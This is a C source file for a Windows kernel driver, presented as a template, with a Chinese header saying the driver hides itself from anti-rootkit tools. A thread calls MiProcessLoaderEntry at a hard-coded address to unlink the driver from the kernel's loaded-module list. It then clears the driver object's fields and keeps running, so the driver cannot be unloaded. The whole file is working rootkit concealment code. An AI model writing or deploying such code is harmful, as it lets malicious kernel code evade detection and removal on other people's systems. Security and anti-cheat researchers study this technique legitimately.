/*************************************************
Copyright (C), 2009-2012    , Level Chip Co., Ltd.
文件名:	main.c
作  者:	钱锐      版本: V0.0.1     新建日期: 2025.01.20
描  述: 隐藏驱动，使正常的arp工具无法识别到该驱动
备  注: 需要使用windbg 使用x nt!MiProcessLoaderEntry 抓取出地址后，才可以正常使用该驱动
		加载驱动后，无法正常卸载该驱动
修改记录:

  1.  日期: 2025.01.20
	  作者: 钱锐
	  内容:
		  1) 此为模板第一个版本；
	  版本:V0.0.1

*************************************************/

#include <ntifs.h>
#include <ntddk.h>

#include "ExportAPI.h"

VOID ThreadProc(PVOID _Context)
{
	PFNMIPROCESSLOADERENTRY MinProcessLoaderEntry = NULL;
	PDRIVER_OBJECT ptDriverObject = (PDRIVER_OBJECT)_Context;
	LARGE_INTEGER tTimeout = RtlConvertLongToLargeInteger(-10 * 1000 * 1000);

	if (!ptDriverObject)
		return;

	KeDelayExecutionThread(KernelMode, FALSE, &tTimeout);		//保证驱动已经加载成功后，再将其从内核驱动链表中删除

#ifdef _X86_
	MinProcessLoaderEntry = (PFNMIPROCESSLOADERENTRY)0x83e8cb37;
#endif // _x86

	if (!MinProcessLoaderEntry)
	{
		KdPrint(("MinProcessLoaderEntry is empty\n"));
		return;
	}

	MinProcessLoaderEntry(ptDriverObject->DriverSection, FALSE);
	
	ptDriverObject->DriverStart = NULL;
	ptDriverObject->DriverSize = 0;
	ptDriverObject->DriverSection = NULL;
	ptDriverObject->DriverInit = NULL;
	ptDriverObject->DriverUnload = NULL;
	ptDriverObject->DeviceObject = NULL;

	while (TRUE)
	{
		KdPrint(("MinProcessLoaderEntry is running\n"));
		KeDelayExecutionThread(KernelMode, FALSE, &tTimeout);
	}

	PsTerminateSystemThread(STATUS_SUCCESS);
}

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	KdPrint(("驱动卸载成功\n"));
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	NTSTATUS lNTStatus = STATUS_SUCCESS;
	HANDLE hThread = NULL;

	DriverObject->DriverUnload = DriverUnload;

	PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, ThreadProc, DriverObject);

	KdPrint(("驱动加载成功\n"));

	return lNTStatus;
}



